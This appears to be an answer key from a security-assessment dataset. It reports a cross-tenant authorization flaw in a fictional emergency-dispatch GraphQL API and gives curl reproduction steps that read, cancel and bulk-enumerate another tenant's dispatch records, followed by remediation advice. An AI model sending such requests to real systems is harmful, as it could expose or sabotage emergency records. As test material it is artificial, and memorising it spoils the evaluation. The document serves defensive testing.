# Expected Response

## System
- Domain: Government / Public Safety
- System: FirstResponse CAD Integration
- Example ID: GQL-0058

## Priority Findings

### Finding 1: Cross-Tenant CAD Record Access + Persistence Poisoning via Lifecycle Mutations (Pattern 4.2)
**Severity:** Critical
**Category:** BOLA / Integrity

**Summary:**
The `getResource` query on `POST /graphql` returns Computer-Aided Dispatch (CAD) records belonging to `tenant-5b48` to an attacker from `tenant-285d`. Per §5.0 (Pattern 4.2 — persistence poisoning via lifecycle actions), the same resolver gap enables `updateResource` and `deleteResource` mutations to corrupt or delete cross-tenant emergency dispatch records — a direct public safety threat.

**Evidence from HAR:**
- Request: `POST https://api.firstresponse-cad-in.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-285d`
- Query: `getResource(id: "R-2058") { resourceId tenantId ownerId data { sensitiveField internalNotes } }`
- Response `200 OK`; `tenantId: "tenant-5b48"`, `ownerId: "other-user-285d5b48"`, `sensitiveField: "CONFIDENTIAL-285d5b48"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-285d5b48`

**Root Cause (§4.0 RISK-GQL-058):** Resolver fetches by `resourceId` only; lifecycle mutations share the same gap.

## Steps to Reproduce

### Step 1 — Cross-tenant CAD read (HAR)
```bash
curl -s -X POST https://api.firstresponse-cad-in.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-285d" \
  -d '{"query": "query VulnerableOp { getResource(id: \"R-2058\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** `CONFIDENTIAL-285d5b48` from `tenant-5b48`. **Secure:** FORBIDDEN.

### Step 2 — Persistence poisoning: corrupt cross-tenant CAD dispatch record
```bash
curl -s -X POST https://api.firstresponse-cad-in.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-285d" \
  -d '{"query": "mutation { updateResource(id: \"R-2058\", input: {status: \"cancelled\"}) { resourceId status } }"}'
```
**Vulnerable:** Emergency dispatch record `R-2058` (`tenant-5b48`) updated to `cancelled` — public safety impact. **Secure:** FORBIDDEN.

### Step 3 — Bulk cross-tenant CAD enumeration
```bash
curl -s -X POST https://api.firstresponse-cad-in.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-285d" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2058\", \"R-5b48-002\"]) { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable:** Returns CAD records from `tenant-5b48`.

## Remediation
1. Resolver tenant guard on `getResource`, `updateResource`, `deleteResource`.
2. Per-ID ownership filter in `bulkResourceLookup`.
3. Audit log for all lifecycle mutations on emergency dispatch records.
4. Redis cache key `resourceId:tenantId`.
